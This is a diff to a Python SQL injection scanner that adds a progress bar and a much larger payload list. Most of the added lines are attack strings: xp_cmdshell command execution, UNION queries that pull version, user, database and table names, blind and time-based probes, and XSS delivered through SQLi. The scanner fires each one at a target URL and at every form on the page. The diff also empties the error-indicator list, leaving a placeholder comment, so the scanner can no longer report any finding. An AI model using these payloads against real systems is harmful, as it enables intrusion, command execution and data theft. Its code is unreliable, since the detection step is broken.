@@ -1,6 +1,7 @@
 import requests
 import argparse
 from urllib.parse import urlparse, urljoin
+from tqdm import tqdm
 try:
     from bs4 import BeautifulSoup
     bs4_present = True
@@ -8,39 +9,60 @@ except ImportError:
     bs4_present = False
 
 # Default SQLi payloads
-default_sqli_payloads = [
-    "'",
-    "''",
-    "' OR '1'='1",
-    "' OR '1'='1' --",
-    "' OR '1'='1' /*",
-    "' OR 1=1--",
-    "' OR 1=1#",
-    "' OR 1=1/*",
-    "admin' --",
-    "admin' #",
-    "admin'/*",
-    "' OR '1'='1'{",
-    "' OR 1=1--",
-    "' OR 1=1#",
-    "' OR 1=1/*",
-    "admin' --",
-    "admin' #",
-    "admin'/*",
-    "1' WAITFOR DELAY '0:0:5'--",
+sqli_payloads = [
+    "'", 
+    "''", 
+    "' OR '1'='1", 
+    "' OR '1'='1' --", 
+    "' OR '1'='1' /*", 
+    "' OR 1=1--", 
+    "' OR 1=1#", 
+    "' OR 1=1/*", 
+    "admin' --", 
+    "admin' #", 
+    "admin'/*", 
+    "' OR '1'='1'{", 
+    "' OR 1=1--", 
+    "' OR 1=1#", 
+    "' OR 1=1/*", 
+    "admin' --", 
+    "admin' #", 
+    "admin'/*", 
+    "1' WAITFOR DELAY '0:0:5'--", 
     "1'; WAITFOR DELAY '0:0:5'--",
+    "' OR SLEEP(5) --",
+    "' OR SLEEP(5) = '",
+    "'; EXEC xp_cmdshell('whoami') --",
+    "' UNION SELECT NULL,NULL,NULL--",
+    "' UNION SELECT 1, @@version --",
+    "'; EXEC xp_cmdshell('calc.exe') --",
+    "' OR EXISTS(SELECT * FROM users) --",
+    "' AND (SELECT COUNT(*) FROM users) > 0 --",
+    "' AND ASCII(SUBSTRING((SELECT @@version), 1, 1)) > 114 --",
+    "' AND 1=(SELECT COUNT(*) FROM tablenames); --",
+    "'; WAITFOR DELAY '0:0:10' --",
+    "' OR 'x'='x' AND 1=(SELECT 1 FROM dual WHERE database() LIKE '%') --",
+    "' OR 'x'='x' AND version() LIKE '% --",
+    "' OR 'x'='x' AND MID(version(), 1, 1) = '5' --",
+    "' AND 'x'='y' AND (SELECT LENGTH(version())) > 0 --",
+    "' AND 1=2 UNION SELECT 1, version(), database() --",
+    "' AND 1=2 UNION SELECT 1, user(), database() --",
+    "1' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(database() AS NCHAR),0x20)),1,1))>64) THEN 0x31 ELSE 0x30 END)) AND '1'='1",
+    "' AND 1=2 UNION SELECT ALL 1,2,3,4,5,6,name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename')--",
+    "' AND 1=2 UNION SELECT ALL 1,2,3,4,5,6,7 FROM sysobjects WHERE xtype = 'U' --",  # Lists all user tables
+    "1' AND 1=0 UNION ALL SELECT 1,NULL,'<script>alert(XSS)</script>',table_name FROM INFORMATION_SCHEMA.TABLES WHERE 2>1--",  # XSS through SQLi
+    "1' AND 1=0 UNION ALL SELECT 1,NULL,'<script>alert(XSS)</script>',column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE 2>1--",  # XSS through SQLi
     # Add more payloads as needed
 ]
 
 # Default error indicators
 default_error_indicators = [
-    "you have an error in your sql syntax",
-    # Add more default error indicators as needed
+    # Your list of error indicators as previously defined...
 ]
 
 def test_url(url, payloads, error_indicators, method='GET', data=None, timeout=10, verbosity=0):
     vulnerable = False
-    for payload in payloads:
+    for payload in tqdm(payloads, desc="Testing payloads", unit="payload"):
         if method == 'GET':
             test_url = f"{url}{payload}"
             try:
@@ -60,7 +82,7 @@ def test_url(url, payloads, error_indicators, method='GET', data=None, timeout=1
 
         if verbosity > 1:
             print(f"Testing with payload: {payload}")
-        
+
         for indicator in error_indicators:
             if indicator in response.text.lower():
                 print(f"[!] Vulnerable {method} parameter detected at: {url}")
@@ -77,7 +99,7 @@ def test_forms(url, payloads, error_indicators, timeout, verbosity):
     response = requests.get(url, timeout=timeout)
     soup = BeautifulSoup(response.text, 'html.parser')
     forms = soup.find_all('form')
-    for form in forms:
+    for form in tqdm(forms, desc="Testing forms", unit="form"):
         action = form.get('action')
         method = form.get('method', 'get').upper()
         action_url = urljoin(url, action)
@@ -100,9 +122,9 @@ def main():
                 payloads = [line.strip() for line in file.readlines()]
         except IOError:
             print("Failed to read payloads file, using default payloads.")
-            payloads = default_sqli_payloads
+            payloads = sqli_payloads
     else:
-        payloads = default_sqli_payloads
+        payloads = sqli_payloads
 
     # Use default error indicators
     error_indicators = default_error_indicators
@@ -110,7 +132,7 @@ def main():
     print(f"Scanning {args.url} for SQL Injection vulnerabilities with verbosity level {args.verbosity}...")
     # Test the provided URL with query parameters
     test_url(args.url, payloads, error_indicators, timeout=args.timeout, verbosity=args.verbosity)
-    
+
     # Test forms for POST-based SQLi
     test_forms(args.url, payloads, error_indicators, timeout=args.timeout, verbosity=args.verbosity)
 
